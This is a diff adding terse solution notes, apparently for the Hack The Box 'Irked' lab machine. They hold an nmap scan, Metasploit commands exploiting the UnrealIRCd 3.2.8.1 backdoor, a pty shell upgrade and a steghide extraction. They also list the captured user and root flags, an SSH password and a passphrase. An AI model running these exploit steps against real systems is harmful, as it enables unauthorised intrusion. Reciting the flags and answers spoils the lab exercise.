@@ -1,0 +1,23 @@
+1. nmap -p- -sV 10.10.10.117 --open
+2. 
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhosts 10.10.10.117
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rport 6697
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
+3. python -c 'import pty; pty.spawn("/bin/bash")'
+4. steghide extract -sf irked.jpg
+
+
+ls -la
+
+flags user = 4a66a78b12dc0e661a59d3f5c0267a8e
+flags root = 8d8e9e8be64654b6dccc3bff4522daf3
+
+
+pass ssh = Kab6h+m+bbp2J:HG 
+
+UPupDOWNdownLRlrBAbaSSss
+
+https://www.hackingarticles.in/hack-the-box-irked-walkthrough/
+https://www.youtube.com/watch?v=2SAkYoNchys
+https://sistemas.com/irc.php
